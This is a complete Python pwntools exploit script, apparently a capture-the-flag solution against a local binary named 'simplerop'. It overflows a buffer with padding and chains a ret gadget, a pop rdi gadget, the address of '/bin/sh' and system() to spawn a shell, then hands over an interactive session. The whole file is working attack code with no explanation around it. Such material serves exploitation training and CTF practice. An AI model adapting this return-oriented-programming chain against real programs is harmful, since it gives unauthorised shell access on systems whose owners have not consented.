from pwn import *

elf = ELF('./simplerop')

p = process('./simplerop')

POP_RDI = p64(0x0000000000401273)
RET = p64(0x000000000040101a)
binsh = elf.search('/bin/sh').next()
system = 0x401080

log.info('Shell: {}'.format(hex(binsh)))
log.info('System: {}'.format(hex(system)))

payload = 'A' * 8 + RET + POP_RDI + p64(binsh) + p64(system)
p.recvuntil('Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.\n')
p.sendline(payload)
p.interactive()
p.close()